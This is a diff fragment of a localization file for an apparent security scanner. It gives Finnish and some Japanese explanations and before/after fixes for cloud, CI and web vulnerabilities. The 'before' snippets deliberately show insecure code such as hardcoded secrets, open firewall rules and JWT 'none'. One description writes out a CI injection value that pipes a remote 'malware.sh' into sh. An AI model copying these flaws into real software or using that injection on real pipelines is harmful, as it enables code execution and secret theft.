+    title: "Salaisuus on kirjoitettu selväkielisenä Kubernetes-manifestin env-muuttujaan",
+    description:
+      'Ympäristömuuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo ("value:") sen sijaan, että se luettaisiin Secretistä ("valueFrom.secretKeyRef"). Itse manifesti — usein commitoitu repositorioon — sisältää siis salaisuuden selväkielisenä, näkyvissä jopa sille, joka voi vain lukea konfiguraation, ei välttämättä suorittaa komentoja klusterissa.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Terraform-security group avaa arkaluonteisen portin koko internetille",
+    description:
+      'Sääntö, jonka "cidr_blocks" sisältää 0.0.0.0/0 (minkä tahansa IP-osoitteen), on lähellä arkaluonteista porttia — SSH (22), RDP (3389) tai tyypillinen tietokantaportti (MySQL, Postgres, MongoDB, Redis, SQL Server). Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # vain oma yksityinen verkkosi, tai bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Google Cloud -palomuurisääntö avaa arkaluonteisen portin koko internetille",
+    description:
+      'Resurssi "google_compute_firewall", jonka "source_ranges" sisältää 0.0.0.0/0 (minkä tahansa IP-osoitteen), sallii liikenteen arkaluonteiseen porttiin — SSH (22), RDP (3389) tai tyypillinen tietokantaportti (MySQL, Postgres, MongoDB, Redis, SQL Server). Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # vain oma yksityinen verkkosi, tai bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Azure-verkkosääntö avaa arkaluonteisen portin koko internetille",
+    description:
+      'Verkon suojaussääntö ("azurerm_network_security_rule", tai "security_rule"-lohko "azurerm_network_security_group"-resurssin sisällä), jonka "source_address_prefix" on "*" tai "0.0.0.0/0", suunta "Inbound" ja käyttöoikeus "Allow", lähellä arkaluonteista porttia — SSH (22), RDP (3389) tai tyypillinen tietokantaportti. Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # vain oma yksityinen verkkosi, tai bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Salaisuus on kirjoitettu Terraform-muuttujan oletusarvoksi",
+    description:
+      'Muuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo sen "default"-kentässä. Toisin kuin ajonaikana välitetty arvo (tfvars, TF_VAR_*-ympäristömuuttujat), oletusarvo päätyy lähdekoodiin — ja jos repositorio on jaettu tai julkinen, kuka tahansa näkee sen, jopa ilman pääsyä Terraform-tilaan.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # ei oletusarvoa: välitä .tfvars-tiedostolla (gitin ulkopuolella) tai TF_VAR_db_password-ympäristömuuttujalla\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "Ulkoisen käyttäjän hallitsema arvo päätyy suoraan CI:n shell-komentoon",
+    description:
+      'GitHub Actions -workflown "run:"-komento interpoloi suoraan arvon, kuten pull requestin otsikon, branchin nimen tai kommentin tekstin — kaikki kirjoitettavissa kenen tahansa toimesta, joka avaa pull requestin tai kommentin, jopa ulkoisesta forkista. Arvo kuten `"; curl malware.sh | sh #` suorittaisi mielivaltaisia komentoja CI:ssä, pääsyllä kaikkiin kyseisessä workflow\'ssa saatavilla oleviin salaisuuksiin.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # välitetty ympäristömuuttujana, ei koskaan interpoloitu suoraan komentoon`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflow suorittaa ulkoisen pull requestin koodin pääsyllä repositorion salaisuuksiin",
+    description:
+      'Workflow käyttää "pull_request_target" -tapahtumaa — joka ajetaan perusrepositorion oikeuksilla ja salaisuuksilla jopa ulkopuolisesta forkista avatulle pull requestille — ja tekee checkoutin itse pull requestin koodista ("github.event.pull_request.head"), ei perusbranchista. Pull requestin avaaja saa käytännössä oman koodinsa suoritukseen pääsyllä näihin salaisuuksiin.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Tekee checkoutin perusbranchista, ei PR:n koodista — tai käytä\n      # "pull_request" "pull_request_target":n sijaan, jos et tarvitse\n      # laajempia oikeuksia/salaisuuksia.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Pyynnön data deserialisoidaan formaatilla, joka voi suorittaa koodia",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) tai node-serialize-kirjasto (Node) deserialisoi arvon, joka on otettu suoraan pyynnöstä. Toisin kuin JSON, nämä formaatit voivat esittää ja suorittaa koodia jo itse deserialisoinnin aikana — lähetetyn arvon hallitsija voi saada mielivaltaisen koodin suoritettua palvelimella.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON ei koskaan suorita koodia jäsennyksen aikana, toisin kuin pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Koodi hyväksyy eksplisiittisesti allekirjoittamattomia JWT-tokeneita ("none"-algoritmi)',
+    description:
+      '"none" esiintyy JWT-tokenin varmentamiseen hyväksyttyjen algoritmien joukossa. Tokenilla, jonka algoritmi on "none", ei ole allekirjoitusta varmennettavaksi: kuka tahansa voi rakentaa sellaisen millä tahansa sisällöllä (esim. admin-roolilla), ja koodi hyväksyisi sen kelvollisena.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // älä koskaan sisällytä "none"-arvoa hyväksyttyihin algoritmeihin`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "Uusi taulu näyttää luodun ilman suojausta",
+    description:
+      "SQL-migraatio luo taulun, mutta ei ota Row Level Securitya käyttöön samalle taululle samassa tiedostossa. Niin kauan kuin tilanne on tämä, taululla ei alussa ole mitään rajoitusta sille, kuka voi lukea tai kirjoittaa sitä.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Sivusto hyväksyy pyyntöjä mistä tahansa muusta sivustosta",
+    description:
+      "CORS-otsikko on asetettu hyväksymään pyyntöjä miltä tahansa origin-arvolta (*), tai cors()-middlewarea käytetään ilman rajoituksia. Mikä tahansa kolmannen osapuolen sivusto voi kutsua API:jasi jo kirjautuneen käyttäjän selaimesta.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://sivustosi.fi"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "Admin-oikeuksin varustettu funktio ei tarkista, kuka sitä käyttää",
+    description:
+      "Reitti tai funktio, jonka nimi viittaa admin-operaatioihin, ei sisällä lähellä olevilla riveillä mitään autentikointi- tai roolitarkistusta. Kuka tahansa URL:n tunteva voisi suorittaa sen.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Sivusto voidaan pakottaa suorittamaan ulkoista koodia",
+    description:
+      "Lähtevä HTTP-pyyntö (fetch, axios) käyttää suoraan käyttäjän pyynnöstä tulevaa arvoa kohdeosoitteena. Haitallinen käyttäjä voi saada palvelimesi kutsumaan sisäisiä tai mielivaltaisia osoitteita — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.omapalvelusi.fi"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL ei ole sallittu")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Salasanat on suojattu menetelmällä, joka on nykyään helppo murtaa",
+    description:
+      "Samalla rivillä md5() tai sha1() sovelletaan salasanaan liittyvään arvoon. Nämä algoritmit ovat liian nopeita laskea: hyökkääjä, jolla on tietokanta, voi kokeilla miljardeja salasanoja sekunnissa.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kubernetes-manifestin kontti on asetettu ajettavaksi roottina",
+    description:
+      '"runAsUser: 0" tai "runAsNonRoot: false" securityContextissa pakottaa eksplisiittisesti kontin ajamaan roottina. Jos hyökkääjä onnistuu suorittamaan koodia kontissa (esim. hyödyntämällä haavoittuvaa kirjastoa), root kontin sisällä tekee mahdollisesta pakoyrityksestä hostille — tai laajemmasta vaikutuksesta — helpomman.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetes-manifestin kontti voi saada enemmän oikeuksia kuin sillä aluksi oli",
+    description:
+      '"allowPrivilegeEscalation: true" securityContextissa sallii kontin sisällä olevan prosessin saada enemmän oikeuksia kuin sen käynnistänyt prosessi (esim. setuid-binäärin kautta). Yhdistettynä sovelluksen haavoittuvuuteen tämä on yksi askel lähemmäs koodin suorittamista suuremmilla oikeuksilla kuin on tarkoitettu.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetes-manifestin pod jakaa hostin verkon, prosessit tai jaetun muistin",
+    description:
+      '"hostNetwork", "hostPID" tai "hostIPC" asetettuna true-arvoon vie podin pois sen normaalista eristyksestä: hostNetwork altistaa podin hostin verkolle (ohittaen klusterin verkkopolitiikat), hostPID antaa sille näkyvyyden kaikkiin hostkoneen prosesseihin, hostIPC antaa sille pääsyn hostin jaettuun muistiin. Lähes koskaan tarpeen tavalliselle sovellukselle — tyypillisesti vain matalan tason järjestelmä-/valvontatyökaluille.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Kirjautumislomake ei estä liian montaa peräkkäistä yritystä",
+    description:
+      "Kirjautumisreitti on määritelty tiedostossa, mutta samassa tiedostossa ei näy merkkiäkään rate limiting -middlewaresta. Ilman yritysten rajoitusta hyökkääjä voi kokeilla salasanoja peräkkäin (brute force) ilman että häntä hidastetaan.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Salasanoja tai arkaluonteisia tietoja päätyy lokeihin",
+    description:
+      "console.log-kutsu (tai vastaava) sisältää muuttujan nimeltä password, token, secret tai apiKey. Jos nämä lokit päätyvät ulkoiseen palveluun tai tiedostoon, arkaluonteinen data pysyy selväkielisenä paljon pidempään kuin on tarpeen.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Käyttäjien kirjoittama teksti voisi suorittaa koodia selaimessa",
+    description:
+      "Sisältö lisätään sivulle raakana HTML:nä (dangerouslySetInnerHTML, v-html, .innerHTML) tavallisen tekstin sijaan. Jos tämä sisältö sisältää käyttäjän syötettä, se voi sisältää skriptejä, jotka suoritetaan sivua lukevan käyttäjän selaimessa.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// tai, jos HTML:ää tarvitaan: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Ladattujen tiedostojen tila on näkyvissä kaikille",
+    description:
+      "Tallennusbucket (Supabase Storage, S3) on määritetty julkiseksi. Jos se sisältää käyttäjien lataamia dokumentteja, kuvia tai tiedostoja, kuka tahansa polun tunteva — tai sen arvaava — pääsee niihin käsiksi ilman autentikointia.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// tarjoile tiedostot aikarajoitetuilla allekirjoitetuilla URL:eilla: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Pelkkä linkki riittää poistamaan tai muuttamaan dataa",
+    description:
+      "GET-reitti suorittaa operaation, joka muuttaa dataa (polku sisältää delete/remove/update/edit). GET-pyynnöt suoritetaan jo pelkästä linkin vierailusta tai kuvan lataamisesta ulkoiselta sivustolta — klassinen ponnahduslauta CSRF-hyökkäykselle.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Selaimeen tallennettuja kirjautumistietoja ei ole hyvin suojattu",
+    description:
+      "Pääsytoken tallennetaan localStorageen. Toisin kuin httpOnly-eväste, mikä tahansa sivulla suoritettava skripti (mukaan lukien XSS:n kautta injektoitu haitallinen skripti) voi lukea ja varastaa sen.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// aseta token httpOnly-evästeenä palvelimelta:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Sivustoa voidaan käyttää ohjaamaan huijaussivustolle",
+    description:
+      "Sivusto ohjaa käyttäjän osoitteeseen, joka on otettu suoraan pyynnöstä (query, body, params), tarkistamatta että se on tunnettu domain. Linkki, joka näyttää osoittavan sivustollesi, voi todellisuudessa viedä phishing-sivulle.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Numeron vaihtaminen osoitteessa voisi näyttää jonkun muun tiedot",
+    description:
+      "Tietokantakysely käyttää suoraan URL:sta otettua tunnistetta (req.params.id) tarkistamatta lähellä olevilla riveillä, että se kuuluu pyynnön tekevälle käyttäjälle. Id:n vaihtaminen osoitteessa voisi antaa pääsyn toisen käyttäjän tietoihin — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "Pyynnön arvo päätyy suoraan HTTP-vastauksen otsikkoon",
+    description:
+      "HTTP-vastauksen otsikko asetetaan suoraan pyynnöstä (query, body, params) otetulla arvolla tarkistamatta, ettei se sisällä rivinvaihtoa (CRLF). Hyökkääjä voi lisätä ylimääräisiä otsikoita tai jopa kokonaan erilaisen vastauksen — response splitting — mikä mahdollistaa välimuistin, evästeiden tai muille käyttäjille näytettävän sisällön manipuloinnin.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile ei aseta non-root-käyttäjää",
+    description:
+      "Dockerfilessä ei ole USER-käskyä: ilman sitä kontti ajetaan roottina. Jos hyökkääjä onnistuu suorittamaan koodia kontin sisällä (esim. hyödyntämällä haavoittuvaa kirjastoa), root kontin sisällä tekee mahdollisesta pakoyrityksestä hostille — tai laajemmasta vaikutuksesta ympäröivään järjestelmään — helpomman.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes-manifesti ei eksplisiittisesti pakota ajamaan non-root-käyttäjänä",
+    description:
+      'Manifestissa ei ole "runAsNonRoot"-asetusta missään (ei podin eikä kontin tasolla): ilman sen asettamista kontti ajetaan sillä käyttäjällä, jonka sen image määrittelee — usein oletuksena root, jos image itse ei ole muuttanut tätä. Asettamalla se eksplisiittisesti true-arvoon podin käynnistys epäonnistuu, jos image silti yrittää ajaa roottina, sen sijaan että asia selviäisi vasta vahingon jälkeen.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Kolmannen osapuolen CI-toimintoa ei ole lukittu tarkkaan versioon (commit SHA)",
+    description:
+      'Workflow käyttää kolmannen osapuolen actionia, johon viitataan tagilla tai branchilla (esim. "@v1", "@main") commit SHA:n sijaan. Sen ylläpitäjä — tai joku, joka vaarantaa hänen tilinsä — voi siirtää tämän viittauksen toiseen committiin milloin tahansa, muuttaen hiljaisesti mitä CI:ssä ajetaan, pääsyllä sen salaisuuksiin. Commit SHA osoittaa aina täsmälleen samaan koodiin.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, lukittu commit SHA:han — päivitä SHA kun päivität version`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow myöntää itselleen kaikki tokenin oikeudet sen sijaan, että käyttäisi vain tarvitsemiaan",
+    description:
+      '"permissions: write-all" myöntää workflown GITHUB_TOKENille kirjoitusoikeuden kaikkeen — issueihin, pull requesteihin, paketteihin, deploymentteihin — vaikka workflow käyttäisi vain osaa niistä. Jos workflown jokin vaihe vaarantuu (haitallinen riippuvuus, injektoitu skripti), nämä laajemmat oikeudet kasvattavat sitä, mitä hyväksikäyttäjä voi tehdä.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # vain ne oikeudet, joita workflow oikeasti käyttää`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Istunto- tai autentikointieväste on asetettu ilman Secure- ja HttpOnly-lippuja",
+    description:
+      'Eväste, jonka nimi muistuttaa sessiota/autentikointia/tokenia, asetetaan ilman "httpOnly"- ja "secure"-asetuksia. Ilman httpOnlya sivulla oleva JavaScript — mukaan lukien XSS:n kautta injektoitu koodi — voi lukea kyseisen evästeen. Ilman securea se voidaan myös lähettää salaamattoman HTTP-yhteyden yli.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Haavoittuva riippuvuus:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Korjattua versiota ei vielä tiedossa — harkitse vaihtoehtoista pakettia tai seuraa projektin päivityksiä."
+      ),
+    },
+  }),
+  "docker-unpinned-base-image": {
+    title: 'Dockerfilen peruskuva käyttää ":latest"-tagia',
+    description:
+      'FROM-käsky käyttää eksplisiittisesti ":latest"-tagia tarkan version sijaan. "latest" muuttuu ajan myötä: sama build, uusittuna eri hetkellä, voi saada eri version peruskuvasta — ei-toistettavissa oleva build, ja ei-toivottu päivitys voi tulla ilman että kukaan on päättänyt niin.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile lataa etätiedoston ADD:lla COPY:n sijaan",
+    description:
+      "ADD-käsky http/https-URL:lla lataa tiedoston internetistä buildin aikana ilman eheystarkistusta ja ilman että sisältö näkyy repositoriossa. Jos tämä URL joskus vaarantuu, build sisällyttää mielivaltaista sisältöä ilman että kukaan huomaa sitä pelkästään Dockerfileä lukemalla.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<odotettu hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access on pois käytöstä Terraformissa määritellyssä S3-bucketissa",
+    description:
+      'Yksi tai useampi "aws_s3_bucket_public_access_block"-resurssin neljästä suojauksesta (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) on asetettu false-arvoon. Tämä ei tarkoita, että bucket olisi jo julkinen, mutta se poistaa turvaverkon, joka estäisi sen muuttumisen julkiseksi vahingossa tulevaisuudessa.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraformissa määritelty IAM-policy myöntää täyden pääsyn",
+    description:
+      'Statement, jonka action on "*" ja resource "*", myöntää täyden pääsyn jokaiseen AWS-palveluun ja -resurssiin — sama tarkistus, joka on jo tehty live-IAM-tilalle, tässä luettuna suoraan koodista ennen kuin sitä on edes sovellettu. Tämä voi olla tarkoituksellista hätätilaroolille, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain oikeasti tarvittavat oikeudet.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::sinun-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Google Cloud Storage -bucket on tehty luettavaksi kenelle tahansa",
+    description:
+      'Resurssi "google_storage_bucket_iam_member" tai "google_storage_bucket_iam_binding" myöntää roolin "allUsers"- tai "allAuthenticatedUsers"-arvolle — ensimmäinen tekee bucketista luettavan kenelle tahansa internetissä, jopa ilman Google-tiliä; jälkimmäinen kenelle tahansa, jolla on mikä tahansa Google-tili, ei vain niille, joilla pitäisi olla pääsy.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:joku@example.com"  # vain ne, joilla pitää oikeasti olla pääsy, ei allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Julkinen blob-pääsy on käytössä Azure-tallennustilissä",
+    description:
+      '"allow_blob_public_access" on asetettu true-arvoon "azurerm_storage_account"-resurssissa: kuka tahansa, joka tietää julkiseksi tehdyn blobin/containerin URL:n, voi lukea sen ilman mitään autentikointia.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Google Cloud IAM -rooli myöntää täyden pääsyn (Owner/Editor)",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member" (tai vastaava organisaatio-/kansiotasolla) myöntää primitiivisen roolin "roles/owner" tai "roles/editor" — lähes täyden pääsyn jokaiseen projektin palveluun. Tämä voi olla tarkoituksellista hätätilitiliä varten, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain tarkemmat, oikeasti tarvittavat valmiiksi määritellyt roolit.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # vain oikeasti tarvittava valmiiksi määritelty rooli, ei roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Azure-roolimääritys myöntää täyden pääsyn (Owner)",
+    description:
+      '"azurerm_role_assignment" myöntää "Owner"-roolin — täyden pääsyn, mukaan lukien hallinnan muiden käyttäjien oikeuksiin, koko määritetyn scopen yli (tilaus, resurssiryhmä...). Tämä voi olla tarkoituksellista hätätilitiliä varten, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain tarkempi, oikeasti tarvittava rooli (esim. "Contributor" yhdelle resurssiryhmälle).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # vain tarkempi, oikeasti tarvittava rooli, ei Owner koko tilaukselle\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Turvatoken on generoitu satunnaislukugeneraattorilla, joka ei ole kryptografisesti turvallinen",
+    description:
+      "Arvo, jonka nimi on tyyliin token/session/reset/otp/csrf, generoidaan Math.random()-funktiolla (JS), random.random()-funktiolla (Python) tai rand()-funktiolla (PHP) — generaattoreilla, joita ei ole suunniteltu turvallisuutta varten ja joiden sekvenssit ovat ennustettavissa. Näin generoitu token voidaan arvata tai rakentaa uudelleen, mikä tekee tyhjäksi sen olemassaolon tarkoituksen (esim. salasanan palautuslinkki, jonka kuka tahansa voisi ennustaa).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ei Math.random — ennustamaton`,
+    },
+  },
+  "ldap-injection": {
+    title: "LDAP-suodatin rakennetaan yhdistämällä suoraan pyynnön arvo",
+    description:
+      'Rivi, joka rakentaa LDAP-suodattimen (esim. "(uid=...)"), sisältää suoraan pyynnöstä otetun arvon ilman LDAP:n erikoismerkkien escapeamista. Tämän arvon hallitsija voi muuttaa suodattimen logiikkaa — esimerkiksi ohittaa autentikointitarkistuksen tai lukea hakemistodataa, jota hänen ei pitäisi nähdä.',
+    fix: {
+      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
+      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP:n erikoismerkit pitää aina escapeta ennen niiden käyttöä suodattimessa\nclient.search(base, { filter });`,
+    },
+  },
+},
+  ja: {
+  "supabase-service-role-in-client": {
+    title: "Supabaseのシークレットキーがブラウザ向けのファイルに含まれています",
+    description:
+      "公開プレフィックス(例: NEXT_PUBLIC_、VITE_)が付いた変数、またはクライアント側のファイルがSupabaseのservice role keyを参照しています。このキーはRow Level Securityを回避します。ブラウザのバンドルに含まれると、誰でもそれを読み取ってデータベース管理者として操作できてしまいます。",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (サーバーのみ)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "コードに直接パスワードや秘密鍵が書かれています",
+    description:
+      "APIキー、トークン、またはパスワードが、環境変数から読み込まれず、リテラル値として書かれているようです。ソースコード(公開リポジトリならそのリポジトリ)を読んだ人は誰でもその秘密情報を手に入れます。",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "プロジェクトの実際のパスワードを含むファイルが解析対象に含まれています",
+    description:
+      ".env.exampleではなく、実際の値が入った.envファイルが解析に含まれています。このファイルがリポジトリや公開デプロイに含まれると、そこに書かれた認証情報がすべて漏洩します。",
+    fix: {
